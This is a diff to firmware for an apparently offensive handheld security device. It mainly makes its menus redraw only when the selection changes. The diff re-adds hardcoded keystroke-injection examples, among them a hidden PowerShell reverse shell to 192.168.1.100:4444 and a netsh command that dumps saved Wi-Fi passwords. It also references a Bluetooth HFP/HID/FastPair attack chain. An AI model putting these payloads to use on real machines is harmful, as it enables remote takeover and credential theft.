@@ -2675,88 +2675,89 @@ String selectFileFromSD() {
     }
     
     int selected = 0, scrollOffset = 0;
+    int lastSelected = -1, lastScrollOffset = -1;
     bool exitMenu = false;
     int menuStartY = 60, menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > fileCount) maxVisibleItems = fileCount;
     
     while(!exitMenu) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - strlen("SD CARD FILES") * 12) / 2, 15);
-        tft.print("SD CARD FILES");
-        tft.setTextSize(1);
-        
-        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-        tft.setCursor(20, 40);
-        tft.print("Found: "); tft.print(fileCount); tft.print(" files");
-        
-        for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < fileCount; i++) {
-            int fileIdx = scrollOffset + i;
-            int yPos = menuStartY + (i * menuItemHeight);
-            if(yPos + menuItemHeight > tftHeight - 45) break;
+        if(selected != lastSelected || scrollOffset != lastScrollOffset) {
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
             
-            if(fileIdx == selected) {
-                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
-                tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(25, yPos + 8);
-                tft.print("> ");
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setTextSize(2);
+            tft.setCursor((tftWidth - strlen("SD CARD FILES") * 12) / 2, 15);
+            tft.print("SD CARD FILES");
+            tft.setTextSize(1);
+            
+            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+            tft.setCursor(20, 40);
+            tft.print("Found: "); tft.print(fileCount); tft.print(" files");
+            
+            for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < fileCount; i++) {
+                int fileIdx = scrollOffset + i;
+                int yPos = menuStartY + (i * menuItemHeight);
+                if(yPos + menuItemHeight > tftHeight - 45) break;
+                
+                if(fileIdx == selected) {
+                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(25, yPos + 8);
+                    tft.print("> ");
+                } else {
+                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(25, yPos + 8);
+                    tft.print("  ");
+                }
+                
+                String displayName = files[fileIdx];
+                if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
+                tft.print(displayName);
+            }
+            
+            if(fileCount > maxVisibleItems) {
+                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                tft.setCursor(tftWidth - 25, menuStartY + 5);
+                if(scrollOffset > 0) tft.print("^");
+                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
+                if(scrollOffset + maxVisibleItems < fileCount) tft.print("v");
+            }
+            
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 35);
+            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
+            
+            lastSelected = selected;
+            lastScrollOffset = scrollOffset;
+        }
+        
+        if(check(EscPress)) { delay(200); exitMenu = true; return ""; }
+        else if(check(PrevPress)) {
+            delay(150);
+            if(selected > 0) {
+                selected--;
+                if(selected < scrollOffset) scrollOffset = selected;
             } else {
-                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(25, yPos + 8);
-                tft.print("  ");
+                selected = fileCount - 1;
+                scrollOffset = std::max(0, fileCount - maxVisibleItems);
             }
-            
-            String displayName = files[fileIdx];
-            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
-            tft.print(displayName);
-        }
-        
-        if(fileCount > maxVisibleItems) {
-            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-            tft.setCursor(tftWidth - 25, menuStartY + 5);
-            if(scrollOffset > 0) tft.print("^");
-            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
-            if(scrollOffset + maxVisibleItems < fileCount) tft.print("v");
-        }
-        
-        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-        
-        bool inputProcessed = false;
-        while(!inputProcessed) {
-            if(check(EscPress)) { delay(200); exitMenu = true; return ""; }
-            else if(check(PrevPress)) {
-                delay(150);
-                if(selected > 0) {
-                    selected--;
-                    if(selected < scrollOffset) scrollOffset = selected;
-                } else {
-                    selected = fileCount - 1;
-                    scrollOffset = std::max(0, fileCount - maxVisibleItems);
-                }
-                inputProcessed = true;
-            } else if(check(NextPress)) {
-                delay(150);
-                if(selected < fileCount - 1) {
-                    selected++;
-                    if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
-                } else {
-                    selected = 0;
-                    scrollOffset = 0;
-                }
-                inputProcessed = true;
-            } else if(check(SelPress)) {
-                delay(200);
-                return files[selected];
+        } else if(check(NextPress)) {
+            delay(150);
+            if(selected < fileCount - 1) {
+                selected++;
+                if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
+            } else {
+                selected = 0;
+                scrollOffset = 0;
             }
-            if(!inputProcessed) delay(50);
+        } else if(check(SelPress)) {
+            delay(200);
+            return files[selected];
         }
+        delay(50);
     }
     return "";
 }
@@ -2793,104 +2794,104 @@ String getScriptFromUser() {
     scripts[scriptCount++] = "Cancel";
     
     int selected = 0, scrollOffset = 0;
+    int lastSelected = -1, lastScrollOffset = -1;
     bool exitMenu = false;
     int menuStartY = 60, menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > scriptCount) maxVisibleItems = scriptCount;
     
     while(!exitMenu) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - strlen("SELECT SCRIPT") * 12) / 2, 15);
-        tft.print("SELECT SCRIPT");
-        tft.setTextSize(1);
-        
-        for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < scriptCount; i++) {
-            int scriptIdx = scrollOffset + i;
-            int yPos = menuStartY + (i * menuItemHeight);
-            if(yPos + menuItemHeight > tftHeight - 45) break;
+        if(selected != lastSelected || scrollOffset != lastScrollOffset) {
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
             
-            if(scriptIdx == selected) {
-                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
-                tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(25, yPos + 8);
-                tft.print("> ");
-            } else {
-                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(25, yPos + 8);
-                tft.print("  ");
-            }
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setTextSize(2);
+            tft.setCursor((tftWidth - strlen("SELECT SCRIPT") * 12) / 2, 15);
+            tft.print("SELECT SCRIPT");
+            tft.setTextSize(1);
             
-            String displayName = scripts[scriptIdx];
-            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
-            tft.print(displayName);
-        }
-        
-        if(scriptCount > maxVisibleItems) {
-            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-            tft.setCursor(tftWidth - 25, menuStartY + 5);
-            if(scrollOffset > 0) tft.print("^");
-            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
-            if(scrollOffset + maxVisibleItems < scriptCount) tft.print("v");
-        }
-        
-        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-        
-        bool inputProcessed = false;
-        while(!inputProcessed) {
-            if(check(EscPress)) { delay(200); exitMenu = true; return ""; }
-            else if(check(PrevPress)) {
-                delay(150);
-                if(selected > 0) {
-                    selected--;
-                    if(selected < scrollOffset) scrollOffset = selected;
-                } else {
-                    selected = scriptCount - 1;
-                    scrollOffset = std::max(0, scriptCount - maxVisibleItems);
-                }
-                inputProcessed = true;
-            } else if(check(NextPress)) {
-                delay(150);
-                if(selected < scriptCount - 1) {
-                    selected++;
-                    if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
-                } else {
-                    selected = 0;
-                    scrollOffset = 0;
-                }
-                inputProcessed = true;
-            } else if(check(SelPress)) {
-                delay(200);
+            for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < scriptCount; i++) {
+                int scriptIdx = scrollOffset + i;
+                int yPos = menuStartY + (i * menuItemHeight);
+                if(yPos + menuItemHeight > tftHeight - 45) break;
                 
-                if(selected == scriptCount - 1) return "";
-                else if(scripts[selected] == "Load from SD") {
-                    String filename = selectFileFromSD();
-                    if(!filename.isEmpty() && loadScriptFromSD(filename)) return globalScript;
-                    return "";
-                } else if(scripts[selected].startsWith("Example: ")) {
-                    String scriptName = scripts[selected].substring(9);
-                    if(scriptName == "Open Calculator") {
-                        return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
-                    } else if(scriptName == "Open CMD/Terminal") {
-                        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
-                    } else if(scriptName == "WiFi Credentials") {
-                        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER";
-                    } else if(scriptName == "Reverse Shell") {
-                        return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
-                    } else if(scriptName == "Rickroll") {
-                        return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 300\nENTER";
-                    }
+                if(scriptIdx == selected) {
+                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(25, yPos + 8);
+                    tft.print("> ");
+                } else {
+                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(25, yPos + 8);
+                    tft.print("  ");
                 }
-                inputProcessed = true;
+                
+                String displayName = scripts[scriptIdx];
+                if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
+                tft.print(displayName);
             }
-            if(!inputProcessed) delay(50);
+            
+            if(scriptCount > maxVisibleItems) {
+                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                tft.setCursor(tftWidth - 25, menuStartY + 5);
+                if(scrollOffset > 0) tft.print("^");
+                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
+                if(scrollOffset + maxVisibleItems < scriptCount) tft.print("v");
+            }
+            
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 35);
+            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
+            
+            lastSelected = selected;
+            lastScrollOffset = scrollOffset;
         }
+        
+        if(check(EscPress)) { delay(200); exitMenu = true; return ""; }
+        else if(check(PrevPress)) {
+            delay(150);
+            if(selected > 0) {
+                selected--;
+                if(selected < scrollOffset) scrollOffset = selected;
+            } else {
+                selected = scriptCount - 1;
+                scrollOffset = std::max(0, scriptCount - maxVisibleItems);
+            }
+        } else if(check(NextPress)) {
+            delay(150);
+            if(selected < scriptCount - 1) {
+                selected++;
+                if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
+            } else {
+                selected = 0;
+                scrollOffset = 0;
+            }
+        } else if(check(SelPress)) {
+            delay(200);
+            
+            if(selected == scriptCount - 1) return "";
+            else if(scripts[selected] == "Load from SD") {
+                String filename = selectFileFromSD();
+                if(!filename.isEmpty() && loadScriptFromSD(filename)) return globalScript;
+                return "";
+            } else if(scripts[selected].startsWith("Example: ")) {
+                String scriptName = scripts[selected].substring(9);
+                if(scriptName == "Open Calculator") {
+                    return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
+                } else if(scriptName == "Open CMD/Terminal") {
+                    return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
+                } else if(scriptName == "WiFi Credentials") {
+                    return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER";
+                } else if(scriptName == "Reverse Shell") {
+                    return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
+                } else if(scriptName == "Rickroll") {
+                    return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 300\nENTER";
+                }
+            }
+        }
+        delay(50);
     }
     return "";
 }
@@ -3558,122 +3559,122 @@ String selectTargetFromScan(const char* title) {
 
     int maxVisibleDevices = 3, deviceItemHeight = 30, menuStartY = 60;
     int selectedIdx = 0, scrollOffset = 0;
+    int lastSelected = -1, lastScrollOffset = -1;
     bool exitLoop = false;
 
     while(!exitLoop) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+        if(selectedIdx != lastSelected || scrollOffset != lastScrollOffset) {
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
 
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("SELECT DEVICE")) / 2, 15);
-        tft.print("SELECT DEVICE");
-        tft.setTextSize(1);
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setTextSize(2);
+            tft.setCursor((tftWidth - tft.textWidth("SELECT DEVICE")) / 2, 15);
+            tft.print("SELECT DEVICE");
+            tft.setTextSize(1);
 
-        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-        tft.setCursor(20, 40);
-        tft.print("Found: "); tft.print(deviceCount); tft.print(" devices");
+            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+            tft.setCursor(20, 40);
+            tft.print("Found: "); tft.print(deviceCount); tft.print(" devices");
 
-        for(int i = 0; i < maxVisibleDevices && (scrollOffset + i) < deviceCount; i++) {
-            String displayName, address;
-            int rssi = 0;
-            bool fastPair = false, hasHFP = false;
-            uint8_t deviceType = 0;
-
-            if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-                int deviceIndex = scrollOffset + i;
-                if(deviceIndex < scannerData.deviceNames.size()) {
-                    displayName = scannerData.deviceNames[deviceIndex];
-                    address = scannerData.deviceAddresses[deviceIndex];
-                    rssi = scannerData.deviceRssi[deviceIndex];
-                    fastPair = scannerData.deviceFastPair[deviceIndex];
-                    hasHFP = scannerData.deviceHasHFP[deviceIndex];
-                    deviceType = scannerData.deviceTypes[deviceIndex];
-                }
-                xSemaphoreGive(scannerData.mutex);
-            }
-
-            if(displayName.isEmpty()) continue;
-
-            String displayText = displayName;
-            if(displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
-            displayText += " (" + String(rssi) + "dB)";
-            if(fastPair) displayText += " [FP]";
-            if(hasHFP) displayText += " [HFP]";
-            if(deviceType & 0x01) displayText += " [AUDIO]";
-            if(deviceType & 0x02) displayText += " [HID]";
-
-            int yPos = menuStartY + (i * deviceItemHeight);
-            if(yPos + deviceItemHeight > tftHeight - 45) break;
-
-            if(i == selectedIdx - scrollOffset) {
-                tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, TFT_WHITE);
-                tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(20, yPos + 10);
-                tft.print("> ");
-            } else {
-                tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, bruceConfig.bgColor);
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(20, yPos + 10);
-                tft.print("  ");
-            }
-            tft.print(displayText);
-        }
-
-        if(deviceCount > maxVisibleDevices) {
-            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-            tft.setCursor(tftWidth - 25, menuStartY + 10);
-            if(scrollOffset > 0) tft.print("^");
-            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleDevices * deviceItemHeight) - 15);
-            if(scrollOffset + maxVisibleDevices < deviceCount) tft.print("v");
-        }
-
-        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-        bool gotInput = false;
-        while(!gotInput) {
-            if(check(EscPress)) { exitLoop = true; gotInput = true; }
-            else if(check(PrevPress)) {
-                delay(150);
-                if(selectedIdx > 0) {
-                    selectedIdx--;
-                    if(selectedIdx < scrollOffset) scrollOffset = selectedIdx;
-                } else {
-                    selectedIdx = deviceCount - 1;
-                    scrollOffset = std::max(0, (int)deviceCount - maxVisibleDevices);
-                }
-                gotInput = true;
-            } else if(check(NextPress)) {
-                delay(150);
-                if(selectedIdx < deviceCount - 1) {
-                    selectedIdx++;
-                    if(selectedIdx >= scrollOffset + maxVisibleDevices) scrollOffset = selectedIdx - maxVisibleDevices + 1;
-                } else {
-                    selectedIdx = 0;
-                    scrollOffset = 0;
-                }
-                gotInput = true;
-            } else if(check(SelPress)) {
-                String selectedMAC = "", selectedName = "";
+            for(int i = 0; i < maxVisibleDevices && (scrollOffset + i) < deviceCount; i++) {
+                String displayName, address;
+                int rssi = 0;
+                bool fastPair = false, hasHFP = false;
+                uint8_t deviceType = 0;
 
                 if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-                    if(selectedIdx < scannerData.deviceAddresses.size()) {
-                        selectedMAC = scannerData.deviceAddresses[selectedIdx];
-                        selectedName = scannerData.deviceNames[selectedIdx];
+                    int deviceIndex = scrollOffset + i;
+                    if(deviceIndex < scannerData.deviceNames.size()) {
+                        displayName = scannerData.deviceNames[deviceIndex];
+                        address = scannerData.deviceAddresses[deviceIndex];
+                        rssi = scannerData.deviceRssi[deviceIndex];
+                        fastPair = scannerData.deviceFastPair[deviceIndex];
+                        hasHFP = scannerData.deviceHasHFP[deviceIndex];
+                        deviceType = scannerData.deviceTypes[deviceIndex];
                     }
                     xSemaphoreGive(scannerData.mutex);
                 }
 
-                if(!selectedMAC.isEmpty()) {
-                    scannerData.clear();
-                    return selectedMAC + ":0";
+                if(displayName.isEmpty()) continue;
+
+                String displayText = displayName;
+                if(displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
+                displayText += " (" + String(rssi) + "dB)";
+                if(fastPair) displayText += " [FP]";
+                if(hasHFP) displayText += " [HFP]";
+                if(deviceType & 0x01) displayText += " [AUDIO]";
+                if(deviceType & 0x02) displayText += " [HID]";
+
+                int yPos = menuStartY + (i * deviceItemHeight);
+                if(yPos + deviceItemHeight > tftHeight - 45) break;
+
+                if(i == selectedIdx - scrollOffset) {
+                    tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(20, yPos + 10);
+                    tft.print("> ");
+                } else {
+                    tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, bruceConfig.bgColor);
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(20, yPos + 10);
+                    tft.print("  ");
                 }
-                gotInput = true;
+                tft.print(displayText);
             }
-            if(!gotInput) delay(50);
+
+            if(deviceCount > maxVisibleDevices) {
+                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                tft.setCursor(tftWidth - 25, menuStartY + 10);
+                if(scrollOffset > 0) tft.print("^");
+                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleDevices * deviceItemHeight) - 15);
+                if(scrollOffset + maxVisibleDevices < deviceCount) tft.print("v");
+            }
+
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 35);
+            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
+            
+            lastSelected = selectedIdx;
+            lastScrollOffset = scrollOffset;
         }
+
+        if(check(EscPress)) { exitLoop = true; }
+        else if(check(PrevPress)) {
+            delay(150);
+            if(selectedIdx > 0) {
+                selectedIdx--;
+                if(selectedIdx < scrollOffset) scrollOffset = selectedIdx;
+            } else {
+                selectedIdx = deviceCount - 1;
+                scrollOffset = std::max(0, (int)deviceCount - maxVisibleDevices);
+            }
+        } else if(check(NextPress)) {
+            delay(150);
+            if(selectedIdx < deviceCount - 1) {
+                selectedIdx++;
+                if(selectedIdx >= scrollOffset + maxVisibleDevices) scrollOffset = selectedIdx - maxVisibleDevices + 1;
+            } else {
+                selectedIdx = 0;
+                scrollOffset = 0;
+            }
+        } else if(check(SelPress)) {
+            String selectedMAC = "", selectedName = "";
+
+            if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+                if(selectedIdx < scannerData.deviceAddresses.size()) {
+                    selectedMAC = scannerData.deviceAddresses[selectedIdx];
+                    selectedName = scannerData.deviceNames[selectedIdx];
+                }
+                xSemaphoreGive(scannerData.mutex);
+            }
+
+            if(!selectedMAC.isEmpty()) {
+                scannerData.clear();
+                return selectedMAC + ":0";
+            }
+        }
+        delay(50);
     }
     scannerData.clear();
     return "";
@@ -3879,45 +3880,51 @@ int showSubMenu(const char* title, const char* options[], int optionCount) {
     tft.setTextSize(1);
     
     int selected = 0, scrollOffset = 0;
+    int lastSelected = -1, lastScrollOffset = -1;
     int maxVisible = (tftHeight - 80) / 25;
     
     while(true) {
-        tft.fillRect(20, 60, tftWidth - 40, tftHeight - 100, bruceConfig.bgColor);
-        
-        for(int i = 0; i < maxVisible && (scrollOffset + i) < optionCount; i++) {
-            int idx = scrollOffset + i;
-            int yPos = 60 + (i * 25);
+        if(selected != lastSelected || scrollOffset != lastScrollOffset) {
+            tft.fillRect(20, 60, tftWidth - 40, tftHeight - 100, bruceConfig.bgColor);
             
-            String displayText = options[idx];
-            if(displayText.length() > 28) {
-                displayText = displayText.substring(0, 25) + "...";
+            for(int i = 0; i < maxVisible && (scrollOffset + i) < optionCount; i++) {
+                int idx = scrollOffset + i;
+                int yPos = 60 + (i * 25);
+                
+                String displayText = options[idx];
+                if(displayText.length() > 28) {
+                    displayText = displayText.substring(0, 25) + "...";
+                }
+                
+                if(idx == selected) {
+                    tft.fillRect(20, yPos, tftWidth - 40, 20, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(25, yPos + 5);
+                    tft.print("> ");
+                } else {
+                    tft.fillRect(20, yPos, tftWidth - 40, 20, bruceConfig.bgColor);
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(25, yPos + 5);
+                    tft.print("  ");
+                }
+                tft.print(displayText);
             }
             
-            if(idx == selected) {
-                tft.fillRect(20, yPos, tftWidth - 40, 20, TFT_WHITE);
-                tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(25, yPos + 5);
-                tft.print("> ");
-            } else {
-                tft.fillRect(20, yPos, tftWidth - 40, 20, bruceConfig.bgColor);
-                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(25, yPos + 5);
-                tft.print("  ");
+            if(optionCount > maxVisible) {
+                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                tft.setCursor(tftWidth - 25, 65);
+                if(scrollOffset > 0) tft.print("^");
+                tft.setCursor(tftWidth - 25, 65 + (maxVisible * 25) - 10);
+                if(scrollOffset + maxVisible < optionCount) tft.print("v");
             }
-            tft.print(displayText);
+            
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 35);
+            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
+            
+            lastSelected = selected;
+            lastScrollOffset = scrollOffset;
         }
-        
-        if(optionCount > maxVisible) {
-            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-            tft.setCursor(tftWidth - 25, 65);
-            if(scrollOffset > 0) tft.print("^");
-            tft.setCursor(tftWidth - 25, 65 + (maxVisible * 25) - 10);
-            if(scrollOffset + maxVisible < optionCount) tft.print("v");
-        }
-        
-        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
         
         if(check(EscPress)) return -1;
         if(check(PrevPress)) {
@@ -4267,14 +4274,12 @@ void runUniversalAttack(NimBLEAddress target) {
     if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
     
     String deviceName = "";
-    int rssi = -60;
     bool hasHFP = false, hasFastPair = false;
     
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                 deviceName = scannerData.deviceNames[i];
-                rssi = scannerData.deviceRssi[i];
                 hasHFP = scannerData.deviceHasHFP[i];
                 hasFastPair = scannerData.deviceFastPair[i];
                 break;
@@ -4579,66 +4584,67 @@ void runAudioControlTest(NimBLEAddress target) {
     };
 
     int selectedTest = 0;
+    int lastSelected = -1;
     bool exitSubmenu = false;
 
     while(!exitSubmenu) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+        if(selectedTest != lastSelected) {
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
 
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("AUDIO CONTROL TEST")) / 2, 15);
-        tft.print("AUDIO CONTROL TEST");
-        tft.setTextSize(1);
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setTextSize(2);
+            tft.setCursor((tftWidth - tft.textWidth("AUDIO CONTROL TEST")) / 2, 15);
+            tft.print("AUDIO CONTROL TEST");
+            tft.setTextSize(1);
 
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, 60);
-        tft.println("Select Audio Test:");
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setCursor(20, 60);
+            tft.println("Select Audio Test:");
 
-        int maxTests = std::min(AUDIO_TESTS, 5);
-        int testHeight = 35, startY = 90;
+            int maxTests = std::min(AUDIO_TESTS, 5);
+            int testHeight = 35, startY = 90;
 
-        for(int i = 0; i < maxTests; i++) {
-            int yPos = startY + (i * testHeight);
-            if(yPos + testHeight > tftHeight - 45) break;
+            for(int i = 0; i < maxTests; i++) {
+                int yPos = startY + (i * testHeight);
+                if(yPos + testHeight > tftHeight - 45) break;
 
-            String displayName = audioTestNames[i];
-            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
+                String displayName = audioTestNames[i];
+                if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
 
-            if(i == selectedTest) {
-                tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_WHITE);
-                tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(40, yPos + 10);
-                tft.print("> ");
-            } else {
-                tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_DARKGREY);
-                tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
-                tft.setCursor(40, yPos + 10);
-                tft.print("  ");
+                if(i == selectedTest) {
